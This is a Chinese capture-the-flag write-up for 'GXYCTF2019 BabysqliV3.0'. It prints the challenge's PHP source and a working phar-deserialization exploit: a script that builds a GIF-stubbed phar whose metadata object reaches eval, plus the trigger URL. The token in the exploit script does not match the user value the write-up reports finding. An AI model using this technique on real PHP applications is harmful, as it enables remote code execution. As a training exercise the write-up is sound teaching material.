# 原创
：  [GXYCTF2019]BabysqliV3.0

# [GXYCTF2019]BabysqliV3.0

#### [GXYCTF2019]BabysqliV3.0

## 考点

> 
弱口令、PHP反序列化


## 思路

> 
①：题目页面提示我们应该是需要sqli注入，但是用它输入框提示的admin/password一试就进去了…<br/> ②：`http://5f8d9cd4-4695-4428-acc2-b02b0e49d8d9.node3.buuoj.cn/home.php?file=upload`熟悉的形式，用php伪协议读取一下文件试试；<br/> ③：预期解法：审计 upload.php 代码，`$this-&gt;Filename = $_GET['name'];`，可见 $this-&gt;Filename 是可控的，可以通过 name 参数以 get 方式得到；分析最后上传部分的代码，file_get_contents() 使 $uploader 通过__toString() 返回 $this-&gt;Filename，$this-&gt;Filename 可控，因此此处 $this-&gt;Filename 用来触发 phar，__destruct() 方法内 eval($this-&gt;cmd)；


## Payload

> 
伪协议读取home.php


```
&lt;?php
session_start();
echo "&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;Home&lt;/title&gt;";
error_reporting(0);
if(isset($_SESSION['user'])){
        if(isset($_GET['file'])){
                if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
                        die("hacker!");
                }
                else{
                        if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
                                $file = $_GET['file'].".php";
                        }
                        else{
                                $file = $_GET['file'].".fxxkyou!";
                        }
                        echo "当前引用的是 ".$file;
                        require $file;
                }

        }
        else{
                die("no permission!");
        }
}
?&gt;

```

> 
伪协议读取upload.php


```
&lt;?php
error_reporting(0);
class Uploader{
        public $Filename;
        public $cmd;
        public $token;


        function __construct(){
                $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
                $ext = ".txt";
                @mkdir($sandbox, 0777, true);
                if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
                        $this-&gt;Filename = $_GET['name'];
                }
                else{
                        $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext;
                }

                $this-&gt;cmd = "echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';";
                $this-&gt;token = $_SESSION['user'];
        }

        function upload($file){
                global $sandbox;
                global $ext;

                if(preg_match("[^a-z0-9]", $this-&gt;Filename)){
                        $this-&gt;cmd = "die('illegal filename!');";
                }
                else{
                        if($file['size'] &gt; 1024){
                                $this-&gt;cmd = "die('you are too big (′▽`〃)');";
                        }
                        else{
                                $this-&gt;cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this-&gt;Filename . "');";
                        }
                }
        }

        function __toString(){
                global $sandbox;
                global $ext;
                // return $sandbox.$this-&gt;Filename.$ext;
                return $this-&gt;Filename;
        }

        function __destruct(){
                if($this-&gt;token != $_SESSION['user']){
                        $this-&gt;cmd = "die('check token falied!');";
                }
                eval($this-&gt;cmd);
        }
}

if(isset($_FILES['file'])) {
        $uploader = new Uploader();
        $uploader-&gt;upload($_FILES["file"]);
        if(@file_get_contents($uploader)){
                echo "下面是你上传的文件：&lt;br&gt;".$uploader."&lt;br&gt;";
                echo file_get_contents($uploader);
        }
}

?&gt;

```

### 预期解法

> 
由于__destruct() 方法中，想要 eval($this-&gt;cmd); 的前提条件是 $this-&gt;token 和$_SESSION[‘user’] 相等


```
function __destruct(){
	if($this-&gt;token != $_SESSION['user']){
		$this-&gt;cmd = "die('check token falied!');";
	}
	eval($this-&gt;cmd);
}

```

> 
在__construct() 方法中可见如下两行代码


```
$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
$this-&gt;Filename = $sandbox.$_SESSION['user'].$ext;

```

> 
因此可以先随便上传一个 txt，得到的路径中，.txt 前面的就是 $_SESSION[‘user’]


> 
得到：`GXY3fb034f8f0c46f14bf11438f9afccbf4`，生成phar，并将生成的phar上传


```
&lt;?php
class Uploader{
    public $Filename;
    public $cmd;
    public $token;
}

$upload = new Uploader();
$upload-&gt;cmd = "highlight_file('/var/www/html/flag.php');";
$upload-&gt;Filename = 'test';
$upload-&gt;token = 'GXY063c630ae7ab41c6fd121cb4851620a3';

$phar = new Phar("exp.phar");
$phar-&gt;startBuffering();
$phar-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? &gt;');
$phar-&gt;setMetadata($upload); 
$phar-&gt;addFromString("exp.txt", "test");
$phar-&gt;stopBuffering();

```

> 
得到路径`/var/www/html/uploads/93cd61477a821014fa4b00df090ebdcd/GXY3fb034f8f0c46f14bf11438f9afccbf4.txt`


> 
然后将这个路径带上 phar:// 作为 name 参数的值，再随意上传一个文件，因为 $this-&gt;Filename 被我们手工指定为 phar，触发了 phar 反序列化导致命令执行<br/> Payload：`http://5f8d9cd4-4695-4428-acc2-b02b0e49d8d9.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/93cd61477a821014fa4b00df090ebdcd/GXY3fb034f8f0c46f14bf11438f9afccbf4.txt`<br/> 传任意文件后，得到 flag


### 非预期解法

> 
由于`echo file_get_contents($uploader);`上传后会显示出 $uploader 这个文件的内容，所以只要使 $this-Filename 为 flag.php 然后随便传个东西就会得到 flag 了

